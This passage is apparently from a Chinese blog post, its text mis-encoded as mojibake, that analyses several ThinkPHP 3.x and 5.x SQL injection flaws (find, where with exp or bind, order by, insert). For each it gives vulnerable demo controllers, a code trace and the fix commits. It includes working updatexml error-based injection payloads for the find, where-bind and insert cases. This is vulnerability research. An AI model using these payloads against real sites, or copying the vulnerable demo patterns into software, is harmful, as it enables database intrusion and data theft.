·èµ·åæ„Ÿè§‰æœ‰ç‚¹è¯¯å¯¼çš„æ„Ÿè§‰ã€‚</strong></p><p><strong>æ¼æ´å‘ç”Ÿåœ¨findå‚æ•°å¯æ§æ—¶ï¼Œå…¶å®å°±æ˜¯å½“å‚æ•°ä¸ºæ•°ç»„æ—¶ï¼Œä¸”æ•°ç»„é”®å€¼å­˜åœ¨whereï¼Œæœ€åæ„é€ sqlçš„æ—¶å€™ï¼Œå°±ä¼šæŠŠè¿™ä¸ªé”®å€¼æ‹¼æ¥åˆ°whereè¯­å¥ä¸­ï¼Œå¯¼è‡´SQLæ³¨å…¥ã€‚å«whereæ³¨å…¥ä¹Ÿæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯ä¸æ˜¯tpå¤„ç†sqlçš„é‚£ä¸ªwhereå‡½æ•°</strong></p><p>codeDemoï¼š</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class IndexController extends Controller&#123;    public function index()    &#123;        $data &#x3D; M(&#39;Student&#39;)-&gt;find(I(&#39;GET.Sno&#39;));        var_dump($data);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>è·Ÿå…¥findå‡½æ•°</li></ol><p>\Think\Model::find</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240830181613202.png" alt="image-20240830181613202" /></p><ol start="2"><li>æ‰¾åˆ°æœ€ç»ˆæ‰§è¡ŒSQLçš„åœ°æ–¹</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902163234596.png" alt="image-20240902163234596" /></p><ol start="3"><li>å†å¾€é‡Œé¢è·Ÿ</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902163408392.png" alt="image-20240902163408392" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902163417366.png" alt="image-20240902163417366" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902163431277.png" alt="image-20240902163431277" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902163459000.png" alt="image-20240902163459000" /></p><p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯ä¼šæ‹¼æ¥whereçš„éƒ¨åˆ†åˆ°SQLè¯­å¥ä¸­ã€‚</p><ol start="4"><li>æ‰€ä»¥é‡ç‚¹åœ¨optionæ•°ç»„çš„whereé”®å€¼åœ¨å“ª</li></ol><p>çœ‹ä¸€ä¸‹è¿™é‡Œçš„èµ‹å€¼éƒ¨åˆ†ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902163732464.png" alt="image-20240902163732464" /></p><ol start="5"><li>è·Ÿå…¥å›¾ä¸­çš„å‡½æ•°</li></ol><p>æ‰¾åˆ°å¯èƒ½å½±å“optionèµ‹å€¼çš„åœ°æ–¹ï¼ˆå› ä¸ºæˆ‘ä»¬å‡½æ•°ä¼ å…¥çš„å‚æ•°æ˜¯æœ€å¼€å§‹çš„optionï¼‰</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902163901971.png" alt="image-20240902163901971" /></p><p>åˆ†æä¸€ä¸‹è¿™é‡Œçš„ifæ¡ä»¶ï¼Œé¦–å…ˆwhereè‚¯å®šè¦èµ‹å€¼çš„ï¼Œç¬¬äºŒå¤„whereçš„å€¼ä¸æ˜¯æ•°ç»„ï¼ˆæ˜¯æˆ‘ä»¬ä¼ å…¥çš„sqlæ³¨å…¥payloadï¼‰ï¼Œå› æ­¤æ•´ä¸ªè¿‡ç¨‹ä¸­optionsçš„whereçš„å€¼ä¸ä¼šå˜ã€‚</p><p>å› æ­¤æ•´ä¸ªæ¼æ´åˆ©ç”¨è¿‡ç¨‹å°±å¾ˆæ¸…æ™°äº†ï¼Œæˆ‘ä»¬èµ‹å€¼çš„æ—¶å€™é€‰æ‹©èµ‹å€¼æ•°ç»„ï¼Œç„¶åæ’å…¥SQLæ³¨å…¥payloadå³å¯ã€‚</p><p>Sno[where]=1 and 1=updatexml(1,concat(0x7e,(select user()),0x7e),1)%23</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902164834951.png" alt="image-20240902164834951" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902164651970.png" alt="image-20240902164651970" /></p><p>æ•´ä¸ªåˆ©ç”¨å®Œæˆã€‚</p><p>æˆ‘ä»¬æ­£å¸¸ä¼ å‚Sno=1æ—¶çš„opionsæ•°ç»„ï¼š</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902164736931.png" alt="image-20240902164736931" /></p><h4 id="æ¼æ´ä¿®å¤"><a class="markdownIt-Anchor" href="#æ¼æ´ä¿®å¤"></a> æ¼æ´ä¿®å¤</h4><p><a href="https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04">https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04</a></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902165021921.png" alt="image-20240902165021921" /></p><p>é‡ç‚¹åœ¨åœˆå‡ºæ¥çš„éƒ¨åˆ†ï¼Œä¹‹å‰è·å–optionsçš„æ—¶å€™æ˜¯æ“ä½œåŸå§‹å‡½æ•°å‚æ•°çš„ï¼Œæ›´æ–°åä¸æ“ä½œåŸå§‹å‚æ•°äº†ï¼Œæ¼æ´ä¹Ÿå°±ä¸å­˜åœ¨äº†ã€‚</p><h3 id="12-whereæ–¹æ³•expæ³¨å…¥å…¨ç‰ˆæœ¬"><a class="markdownIt-Anchor" href="#12-whereæ–¹æ³•expæ³¨å…¥å…¨ç‰ˆæœ¬"></a> 1.2 whereæ–¹æ³•+expæ³¨å…¥ï¼ˆå…¨ç‰ˆæœ¬ï¼‰</h3><h4 id="vuldemo-2"><a class="markdownIt-Anchor" href="#vuldemo-2"></a> VulDemo</h4><ul><li>whereå‚æ•°å¯æ§</li><li>ç»“åˆfindå‡½æ•°</li><li>ä¸ä½¿ç”¨tpè‡ªå¸¦çš„Iå‡½æ•°è·å–å‚æ•°</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$Stu</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Student'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$no</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sno'</span> <span class="token operator">=></span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$Stu</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$no</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å½±å“ç‰ˆæœ¬-2"><a class="markdownIt-Anchor" href="#å½±å“ç‰ˆæœ¬-2"></a> å½±å“ç‰ˆæœ¬</h4><p>æœªä¿®å¤ï¼Œä½†éœ€è¦ä¸ä½¿ç”¨TPçš„Iå‡½æ•°è·å–å‚æ•°</p><h4 id="æ¼æ´åˆ†æ-2"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ†æ-2"></a> æ¼æ´åˆ†æ</h4><ol><li>whereæ¥è·å–å‚æ•°</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902180246363.png" alt="image-20240902180246363" /></p><ol start="2"><li>æ¼æ´è§¦å‘ç‚¹è¿˜æ˜¯åœ¨findå‡½æ•°ï¼Œè§£æwhereçš„éƒ¨åˆ†ã€‚</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902180718410.png" alt="image-20240902180718410" /></p><ol start="3"><li>é‡ç‚¹åœ¨è¿™é‡Œï¼Œå½“æ•°æ®ç¬¬ä¸€ä¸ªå€¼ä¸ºexpæ—¶ï¼Œwhereä¼šç›´æ¥æ‹¼æ¥ç¬¬æ•°ç»„ç¬¬äºŒä¸ªå€¼</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902180958738.png" alt="image-20240902180958738" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240902181103234.png" alt="image-20240902181103234" /></p><h4 id="æ¼æ´ä¿®å¤-2"><a class="markdownIt-Anchor" href="#æ¼æ´ä¿®å¤-2"></a> æ¼æ´ä¿®å¤</h4><p>ä½¿ç”¨TPè‡ªå¸¦çš„Iå‡½æ•°è·å–å‚æ•°å³å¯ï¼ˆIå‡½æ•°ä¼šcallbackè¿‡æ»¤ä¸€äº›å…³é”®å­—ï¼‰</p><h3 id="13-whereæ–¹æ³•bindæ³¨å…¥ï¸25"><a class="markdownIt-Anchor" href="#13-whereæ–¹æ³•bindæ³¨å…¥ï¸25"></a> 1.3 whereæ–¹æ³•+bindæ³¨å…¥ï¼ˆâ¤ï¸.2.5ï¼‰</h3><h4 id="vuldemo-3"><a class="markdownIt-Anchor" href="#vuldemo-3"></a> VulDemo</h4><ul><li>whereå‚æ•°å¯æ§</li><li>ç»“åˆsaveä½¿ç”¨</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$Stu</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Student'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sage'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$Stu</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å½±å“ç‰ˆæœ¬-3"><a class="markdownIt-Anchor" href="#å½±å“ç‰ˆæœ¬-3"></a> å½±å“ç‰ˆæœ¬</h4><p>TP&lt;=3.2.4</p><h4 id="æ¼æ´åˆ†æ-3"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ†æ-3"></a> æ¼æ´åˆ†æ</h4><p>è§¦å‘æ–¹å¼ä¸ä¸Šé¢ç±»ä¼¼</p><ol><li>å…ˆçœ‹ä¸€ä¸‹saveæ–¹æ³•éƒ½åšäº†ä»€ä¹ˆ</li></ol><p>å…¶å®å°±æ˜¯updateæ›´æ–°äº†æ•°æ®åº“</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240905175748013.png" alt="image-20240905175748013" /></p><ol start="2"><li>è·Ÿå…¥updateæ–¹æ³•</li></ol><p>è¿™é‡Œçš„optionsä¸ä¸Šé¢åˆ†æçš„ç›¸åŒï¼Œæ˜¯æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240905175854513.png" alt="image-20240905175854513" /></p><ol start="3"><li>è·Ÿå…¥è¿™é‡Œçš„parseBindæ–¹æ³•</li></ol><p>ä¼šå–å€¼èµ‹å€¼åˆ°bind</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240905175953825.png" alt="image-20240905175953825" /></p><ol start="4"><li>çœ‹ä¼šupdateæ–¹æ³•ï¼Œè·Ÿå…¥ä¸‹å‘çš„parseSetæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240905180155824.png" alt="image-20240905180155824" /></p><ol start="5"><li>è·Ÿå…¥è¿™é‡Œçš„bindParamæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240905180242499.png" alt="image-20240905180242499" /></p><ol start="6"><li>é‡æ–°å¤„ç†äº†bindçš„å€¼ï¼Œå¢åŠ äº†ï¼š</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240905180305467.png" alt="image-20240905180305467" /></p><ol start="7"><li>ç»§ç»­å¾€ä¸‹çœ‹ï¼Œçœ‹åˆ°parseWhereæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240905181047505.png" alt="image-20240905181047505" /></p><ol start="8"><li>è·Ÿå…¥é‡Œé¢çš„parseWhereItemæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240905181152601.png" alt="image-20240905181152601" /></p><ol start="9"><li>å½“è¡¨è¾¾å¼bindæ—¶ï¼Œä¼šæ‹¼æ¥key:=value</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240905181250449.png" alt="image-20240905181250449" /></p><ol start="10"><li>çœ‹ä¼šupdateæ‰§è¡Œçš„executeæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240905181339548.png" alt="image-20240905181339548" /></p><ol start="11"><li>å¾ˆæ˜æ˜¾ä¼šèµ°å…¥å›¾ä¸­çš„é€»è¾‘</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240905181429181.png" alt="image-20240905181429181" /></p><p>è¿™é‡Œé¢æœ‰ä¸ªå­—ç¬¦ä¸²æ›¿æ¢æ–¹æ³•</p><p>å°±æ˜¯æŠŠthisâ€”&gt;bindé‡Œé¢çš„key valueå¯¹åº”å…³ç³»ï¼Œç›´æ¥æ›¿æ¢åˆ°stré‡Œé¢ã€‚</p><p>ï¼ˆè¿™é‡Œçš„callbackå†™çš„çœ‹èµ·æ¥å¾ˆéš¾å—ï¼Œå®é™…å¯ä»¥ç›´æ¥å¿½ç•¥ï¼Œå®é™…ä¸Šå°±æ˜¯åšäº†ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œæˆ‘ä»¬ç›´æ¥å»æ‰çœ‹å°±å¯ä»¥ï¼‰</p><p>æ•´ç†å®Œæ•´ä¸ªæµç¨‹äº†ã€‚</p><p>æˆ‘ä»¬ä¼ å‚æ•°å°è¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹å¯èƒ½ä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">Sno<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>bind<span class="token operator">&amp;</span>Sno<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">123</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$Stu</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Student'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sage'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$Stu</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>ä¼ çš„dataå’Œoptionså¦‚ä¸‹</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906140832485.png" alt="image-20240906140832485" /></p><ol start="2"><li>è·Ÿåˆ°é‡Œé¢çš„bindParamå‡½æ•°ï¼Œè¿™é‡Œçš„nameæ˜¯0ï¼Œvalæ˜¯ä¼ å…¥çš„Sageå‚æ•°çš„å€¼</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906141822949.png" alt="image-20240906141822949" /></p><ol start="3"><li>ç¬¬äºŒå¤„è§£æparseWhereï¼Œå½“ä¸ºbindæ—¶ï¼Œä¼šç›´æ¥æ‹¼æ¥</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906142149397.png" alt="image-20240906142149397" /></p><ol start="4"><li>å¤„ç†å®Œçš„SQLå¦‚ä¸‹ï¼Œä¸¤ä¸ªï¼šå°±æ˜¯ä¸Šé¢ä¸¤å¤„å¤„ç†çš„ç»“æœ</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906142435803.png" alt="image-20240906142435803" /></p><ol start="5"><li>è·Ÿåˆ°ä¸Šé¢åˆ†æçš„ç¬¬ä¸‰å¤„çš„å‡½æ•°çš„æ›¿æ¢éƒ¨åˆ†ï¼Œä¼šæŠŠå…¶ä¸­çš„:0æ›¿æ¢æˆ0ã€‚è¿™ä¹Ÿå°±å®Œæˆäº†æ•´ä¸ªsql</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906142740198.png" alt="image-20240906142740198" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906143106502.png" alt="image-20240906143106502" /></p><p>æˆ‘ä»¬å‘ç°åé¢çš„:123æ— æ³•è½¬æ¢ï¼Œå¯¼è‡´SQLæŠ¥é”™ï¼Œ123æ˜¯æˆ‘ä»¬ä¼ çš„Snoçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œè§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œæˆ‘ä»¬è®©Snoçš„ç¬¬äºŒä¸ªå‚æ•°ä»¥0å¼€å§‹ï¼Œè¿™æ ·æ›¿æ¢çš„æ—¶å€™ä¹Ÿä¼šæ›¿æ¢åé¢çš„:äº†ã€‚</p><pre class="line-numbers language-none"><code class="language-none">Sno[0]&#x3D;bind&amp;Sno[1]&#x3D;0 and updatexml(1,concat(0x7e,user(),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906143402155.png" alt="image-20240906143402155" /></p><h4 id="æ¼æ´ä¿®å¤-3"><a class="markdownIt-Anchor" href="#æ¼æ´ä¿®å¤-3"></a> æ¼æ´ä¿®å¤</h4><p>åœ¨tp 3.2.5ç‰ˆæœ¬ä¸­</p><p><a href="https://github.com/top-think/thinkphp/commit/7e47e34af72996497c90c20bcfa3b2e1cedd7fa4">https://github.com/top-think/thinkphp/commit/7e47e34af72996497c90c20bcfa3b2e1cedd7fa4</a></p><p>TPçš„Iæ–¹æ³•è·å–å‚æ•°æ·»åŠ äº†è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦â€œbindâ€</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240905103536028.png" alt="image-20240905103536028" /></p><h3 id="14-orderæ–¹æ³•order-byæ³¨å…¥ï¸24"><a class="markdownIt-Anchor" href="#14-orderæ–¹æ³•order-byæ³¨å…¥ï¸24"></a> 1.4 orderæ–¹æ³•+order byæ³¨å…¥ï¼ˆâ¤ï¸.2.4ï¼‰</h3><h4 id="vuldemo-4"><a class="markdownIt-Anchor" href="#vuldemo-4"></a> VulDemo</h4><pre class="line-numbers language-none"><code class="language-none">public function index()&#123;    $User &#x3D; M(&quot;Users&quot;);    $order_by &#x3D; I(&#39;Get.name&#39;);    $q &#x3D; $User-&gt;where(&#39;id&#x3D;1&#39;)-&gt;order($order_by)-&gt;find();    $this-&gt;getSql($User);    var_dump($q);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å½±å“ç‰ˆæœ¬-4"><a class="markdownIt-Anchor" href="#å½±å“ç‰ˆæœ¬-4"></a> å½±å“ç‰ˆæœ¬</h4><p>TP&lt;3.2.4</p><h4 id="æ¼æ´åˆ†æ-4"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ†æ-4"></a> æ¼æ´åˆ†æ</h4><p>tpçš„modelç±»é»˜è®¤æ²¡æœ‰orderæ–¹æ³•ï¼Œåœ¨__callçš„é­”æœ¯æ–¹æ³•</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906144751269.png" alt="image-20240906144751269" /></p><p>parseOrderä¼šç›´æ¥å°†å­—æ®µæ‹¼æ¥ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906144850165.png" alt="image-20240906144850165" /></p><h4 id="æ¼æ´ä¿®å¤-4"><a class="markdownIt-Anchor" href="#æ¼æ´ä¿®å¤-4"></a> æ¼æ´ä¿®å¤</h4><p>3.2.4 è¿›è¡Œäº†ä¿®å¤</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906145044418.png" alt="image-20240906145044418" /></p><h1 id="0x02-tp5"><a class="markdownIt-Anchor" href="#0x02-tp5"></a> 0x02 TP5</h1><h2 id="ä¸€-sqlæ³¨å…¥"><a class="markdownIt-Anchor" href="#ä¸€-sqlæ³¨å…¥"></a> ä¸€ã€SQLæ³¨å…¥</h2><h3 id="1-insertæ–¹æ³•æ³¨å…¥013-015-10-15"><a class="markdownIt-Anchor" href="#1-insertæ–¹æ³•æ³¨å…¥013-015-10-15"></a> 1. insertæ–¹æ³•æ³¨å…¥ï¼ˆ0.13-0.15, 1.0-1.5)</h3><h4 id="vuldemo-5"><a class="markdownIt-Anchor" href="#vuldemo-5"></a> VulDemo</h4><ul><li>å¼€å¯debug</li><li>insertå‚æ•°å¯æ§</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Update success'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å½±å“ç‰ˆæœ¬-5"><a class="markdownIt-Anchor" href="#å½±å“ç‰ˆæœ¬-5"></a> å½±å“ç‰ˆæœ¬</h4><p>5.0.13&lt;=ThinkPHP&lt;=5.0.15</p><p>5.1.0&lt;=ThinkPHP&lt;=5.1.5</p><h4 id="æ¼æ´åˆ†æ-5"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ†æ-5"></a> æ¼æ´åˆ†æ</h4><ol><li>ç®€å•çš„ç”Ÿæˆå’Œæ‰§è¡Œï¼Œè·Ÿåˆ°ç”Ÿæˆçš„éƒ¨åˆ†</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906175242056.png" alt="image-20240906175242056" /></p><ol start="2"><li>è·å–å‚æ•°ç„¶åæ›¿æ¢ï¼Œç”Ÿæˆsql</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906175446473.png" alt="image-20240906175446473" /></p><ol start="3"><li>è§£æè¿™éƒ¨åˆ†ï¼Œå½“å€¼ä¸ºincã€expã€decæ—¶å€™ï¼Œå‚æ•°ä¼šè¿›è¡Œæ‹¼æ¥</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906175600482.png" alt="image-20240906175600482" /></p><p>åˆ©ç”¨çš„payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]&#x3D;1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>è¿™é‡Œæ‹¿mochazzå¸ˆå‚…çš„å›¾æ¥æ€»ç»“äº†ï¼ˆè¿™ä¸ªå›¾ç”»çš„æ˜¯çœŸå¥½ï¼‰</strong></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906180155561.png" alt="image-20240906180155561" /></p><h4 id="æ¼æ´ä¿®å¤-5"><a class="markdownIt-Anchor" href="#æ¼æ´ä¿®å¤-5"></a> æ¼æ´ä¿®å¤</h4><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240906175933493.png" alt="image-20240906175933493" /></p><h3 id="2-updateæ–¹æ³•æ³¨å…¥16-17"><a class="markdownIt-Anchor" href="#2-updateæ–¹æ³•æ³¨å…¥16-17"></a> 2. updateæ–¹æ³•æ³¨å…¥ï¼ˆ1.6-1.7ï¼‰</h3><h4 id="vuldemo-6"><a class="markdownIt-Anchor" href="#vuldemo-6"></a> VulDemo</h4><ul><li>updateå‚æ•°å¯æ§</li><li>debugå¼€å¯</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span> 